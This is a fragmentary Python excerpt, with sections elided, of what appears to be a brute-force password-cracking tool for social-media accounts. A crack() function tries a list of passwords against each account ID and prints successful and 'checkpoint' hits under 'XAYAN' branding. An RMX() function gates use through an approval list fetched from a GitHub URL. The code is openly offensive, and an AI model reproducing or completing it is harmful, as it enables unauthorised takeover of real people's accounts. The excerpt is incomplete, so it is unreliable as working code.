...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [XAYAN] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;93m[XAYAN-CP] {idf} | {pw}{N}')     
...
def RMX():
  ...
  id = "≠".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/shuvotushar/aproval/blob/main/aproval.txt').text
    if id in httpCaht:
      msg = str(os.geteuid())
      time.sleep(0.3)
      login()
